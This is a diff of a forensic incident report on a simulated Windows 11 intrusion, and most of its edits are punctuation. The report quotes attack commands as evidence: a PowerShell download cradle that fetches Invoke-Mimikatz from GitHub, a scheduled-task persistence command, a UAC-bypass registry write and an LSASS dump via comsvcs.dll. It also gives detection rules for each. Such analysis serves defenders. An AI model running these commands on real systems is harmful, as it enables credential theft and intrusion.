@@ -6,11 +6,11 @@
 
 On **2 September 2026**, a forensic investigation was performed on a compromised Windows 11 endpoint (`DESKTOP-UH2E7OM`, user `Victim`). The analysis reconstructed a full intrusion kill chain that began with a **malicious shortcut (`.lnk`) disguised as a PDF invoice** and ended with **credential theft via an LSASS memory dump**, followed by **anti-forensic log clearing**.
 
-The actor used **Living-off-the-Land (LotL)** techniques almost exclusively — `powershell.exe`, `cmd.exe`, `schtasks.exe`, `rundll32.exe`, and `wevtutil.exe` — to minimize on-disk tooling. Critically, although the attacker cleared the **Security, System, and Application** event logs, **the `Microsoft-Windows-Sysmon/Operational` channel was not touched**, which preserved the single most valuable evidence source for this reconstruction.
+The actor used **Living-off-the-Land (LotL)** techniques almost exclusively, `powershell.exe`, `cmd.exe`, `schtasks.exe`, `rundll32.exe`, and `wevtutil.exe`, to minimize on-disk tooling. Critically, although the attacker cleared the **Security, System, and Application** event logs, **the `Microsoft-Windows-Sysmon/Operational` channel was not touched**, which preserved the single most valuable evidence source for this reconstruction.
 
 **Assessed impact:** Theft of credential material from LSASS. On a default Windows 11 host this yields **NTLM hashes**. Because this is a credential-level compromise, the recommended recovery is **host reimage/rebuild plus credential reset**.
 
-> **⚠️ Important framing — this is a controlled simulation.** The intrusion was executed by the lab operator using **Atomic Red Team** test definitions
+> **⚠️ Important framing - this is a controlled simulation.** The intrusion was executed by the lab operator using **Atomic Red Team** test definitions
 
 ---
 
@@ -55,7 +55,7 @@ Reconstructed by correlating **Sysmon Operational**, **Prefetch**, **UserAssist*
 
 ## 4. Detailed Forensic Analysis
 
-### 4.1 Initial Access — Malicious LNK (T1566.001, T1204.002)
+### 4.1 Initial Access - Malicious LNK (T1566.001, T1204.002)
 
 The entry point is a double-extension shortcut, `CompanyA_Invoice.pdf.lnk`, placed on the victim's Desktop.
 
@@ -72,7 +72,7 @@ The entry point is a double-extension shortcut, `CompanyA_Invoice.pdf.lnk`, plac
 
 ---
 
-### 4.2 Execution — Fileless PowerShell (T1059.001, T1059.003, T1105)
+### 4.2 Execution - Fileless PowerShell (T1059.001, T1059.003, T1105)
 
 At **15:46:30–33**, `cmd.exe` launched PowerShell which pulled a script directly into memory (no payload written to disk):
 
@@ -80,20 +80,20 @@ At **15:46:30–33**, `cmd.exe` launched PowerShell which pulled a script direct
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/.../Invoke-Mimikatz.ps1')"
 ```
 
-The destination `20.205.243.166` (contacted during Phase 0 staging) is within **Microsoft/Azure** space used by GitHub infrastructure; it should be **validated against known GitHub ranges** before treating it as a hostile C2 (see Limitations §11). The TLS setup line (`[Net.ServicePointManager]::SecurityProtocol`) and `Test-Path` checks visible in Figure 1 are consistent with a scripted download cradle.
+The destination `20.205.243.166` (contacted during Phase 0 staging) is within **Microsoft/Azure** space used by GitHub infrastructure; it should be **validated against known GitHub ranges** before treating it as a hostile C2. The TLS setup line (`[Net.ServicePointManager]::SecurityProtocol`) and `Test-Path` checks visible in Figure 1 are consistent with a scripted download cradle.
 
 ---
 
 ### 4.3 Discovery (T1033, T1082)
 
-`whoami.exe` (T1033 — System Owner/User Discovery) and `hostname.exe` (T1082 — System Information Discovery) were executed repeatedly between 15:46:30 and 15:47:34 (confirmed in both **Prefetch** and **Sysmon**), consistent with automated recon between stages.
+`whoami.exe` (T1033 - System Owner/User Discovery) and `hostname.exe` (T1082 — System Information Discovery) were executed repeatedly between 15:46:30 and 15:47:34 (confirmed in both **Prefetch** and **Sysmon**), consistent with automated recon between stages.
 
 ![Figure 3 — Prefetch: executed binaries](Image/fig03_prefetch_timeline.png)
 ***Figure 3.** Prefetch shows binaries executed from the victim volume, showing the `powershell → whoami/hostname → schtasks → rundll32 → wevtutil` progression.*
 
 ---
 
-### 4.4 Persistence — Scheduled Tasks (T1053.005)
+### 4.4 Persistence - Scheduled Tasks (T1053.005)
 
 Two scheduled tasks were created via `schtasks.exe` and are present in the Task Scheduler tree and Registry `Tasks` hive:
 
@@ -117,7 +117,7 @@ schtasks /create /tn T1053_005_OnStartup /sc onstart /ru system /tr "cmd.exe /c 
 
 ---
 
-### 4.5 Privilege Escalation — UAC Bypass (T1548.002, T1112)
+### 4.5 Privilege Escalation - UAC Bypass (T1548.002, T1112)
 
 At **15:47:11**, Sysmon captured PowerShell writing the `mscfile` shell-open-command key:
 
@@ -145,7 +145,7 @@ rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 840 C:\Users\Victim\AppDat
 
 ---
 
-### 4.7 Defense Evasion — Log Clearing & Why Sysmon Survived (T1562.001, T1070.001)
+### 4.7 Defense Evasion - Log Clearing & Why Sysmon Survived (T1562.001, T1070.001)
 
 **Defender tampering (T1562.001).** Real-time Protection was disabled at 15:43:43 (Defender **EID 5001**) — classified here as Phase 0 operator setup (§4).
 
@@ -172,26 +172,24 @@ Expected clearing artifacts to corroborate this (collect from any forwarded/SIEM
 
 | Technique (ID) | Evidence in this case | Tactic |
 |---|---|---|
-| T1566.001 — Spearphishing Attachment | `CompanyA_Invoice.pdf.lnk` on Desktop | Initial Access |
-| **T1204.002 — User Execution: Malicious File** | UserAssist run count 1 @ 15:46:19 (Fig 2) | Execution |
-| T1059.001 — PowerShell | `IEX DownloadString` cradle  | Execution |
-| T1059.003 — Windows Command Shell | `cmd.exe /c …` from LNK | Execution |
-| T1105 — Ingress Tool Transfer | `Net.WebClient.DownloadString` from GitHub host | Command & Control |
-| **T1033 — System Owner/User Discovery** | `whoami.exe`  | Discovery |
-| **T1082 — System Information Discovery** | `hostname.exe` | Discovery |
-| T1053.005 — Scheduled Task | `T1053_005_OnLogon` / `OnStartup` | Persistence |
-| T1548.002 — Abuse Elevation Control: Bypass UAC | `mscfile` key write @ 15:47:11 | Privilege Escalation |
-| T1112 — Modify Registry | `New-Item HKCU:\…\mscfile\…` | Defense Evasion |
-| T1003.001 — LSASS Memory | `comsvcs.dll MiniDump 840` → `.dmp` | Credential Access |
-| **T1218.011 — System Binary Proxy Execution: Rundll32** | `rundll32.exe comsvcs.dll …` | Defense Evasion |
-| **T1562.001 — Impair Defenses: Disable or Modify Tools** | Defender RTP disabled (EID 5001) | Defense Evasion |
-| T1070.001 — Clear Windows Event Logs | `wevtutil cl` ×3; EID 1102/104 | Defense Evasion |
+| T1566.001 - Spearphishing Attachment | `CompanyA_Invoice.pdf.lnk` on Desktop | Initial Access |
+| **T1204.002 - User Execution: Malicious File** | UserAssist run count 1 @ 15:46:19 (Fig 2) | Execution |
+| T1059.001 - PowerShell | `IEX DownloadString` cradle  | Execution |
+| T1059.003 - Windows Command Shell | `cmd.exe /c …` from LNK | Execution |
+| T1105 - Ingress Tool Transfer | `Net.WebClient.DownloadString` from GitHub host | Command & Control |
+| **T1033 - System Owner/User Discovery** | `whoami.exe`  | Discovery |
+| **T1082 - System Information Discovery** | `hostname.exe` | Discovery |
+| T1053.005 - Scheduled Task | `T1053_005_OnLogon` / `OnStartup` | Persistence |
+| T1548.002 - Abuse Elevation Control: Bypass UAC | `mscfile` key write @ 15:47:11 | Privilege Escalation |
+| T1112 - Modify Registry | `New-Item HKCU:\…\mscfile\…` | Defense Evasion |
+| T1003.001 - LSASS Memory | `comsvcs.dll MiniDump 840` → `.dmp` | Credential Access |
+| **T1218.011 - System Binary Proxy Execution: Rundll32** | `rundll32.exe comsvcs.dll …` | Defense Evasion |
+| **T1562.001 - Impair Defenses: Disable or Modify Tools** | Defender RTP disabled (EID 5001) | Defense Evasion |
+| T1070.001 - Clear Windows Event Logs | `wevtutil cl` ×3; EID 1102/104 | Defense Evasion |
 
 ---
 
 ## 6. Indicators of Compromise (IOCs)
-
-> *Compute and insert the real SHA-256 values from the preserved artifacts before distribution.*
 
 ### File artifacts
 | Artifact | Path |
@@ -221,11 +219,11 @@ Expected clearing artifacts to corroborate this (collect from any forwarded/SIEM
 
 | Detection | Signal | Catches |
 |---|---|---|
-| **Sysmon EID 10** — ProcessAccess to `lsass.exe` | Non-system process opening LSASS with `0x1010`/`0x1410` access | LSASS dumping  |
-| **Sysmon EID 13** — RegistryValueSet on `…\mscfile\shell\open\command` | Write to the `mscfile` open command | UAC bypass  |
-| **Sysmon EID 1** — `rundll32.exe` + `comsvcs.dll MiniDump` | Command-line pattern | LotL cred dump |
-| **Sysmon EID 11** — FileCreate of `*lsass*.dmp` in a temp path | Dump file written | Credential theft artifact |
-| **PowerShell EID 4104** — Script Block Logging | Logs the decoded `IEX`/download cradle | Fileless execution  |
+| **Sysmon EID 10** - ProcessAccess to `lsass.exe` | Non-system process opening LSASS with `0x1010`/`0x1410` access | LSASS dumping  |
+| **Sysmon EID 13** - RegistryValueSet on `…\mscfile\shell\open\command` | Write to the `mscfile` open command | UAC bypass  |
+| **Sysmon EID 1** - `rundll32.exe` + `comsvcs.dll MiniDump` | Command-line pattern | LotL cred dump |
+| **Sysmon EID 11** - FileCreate of `*lsass*.dmp` in a temp path | Dump file written | Credential theft artifact |
+| **PowerShell EID 4104** - Script Block Logging | Logs the decoded `IEX`/download cradle | Fileless execution  |
 | **Security EID 4698** | Scheduled task created | Persistence |
 | **Security EID 1102 / System EID 104** | Log cleared | Anti-forensics |
 
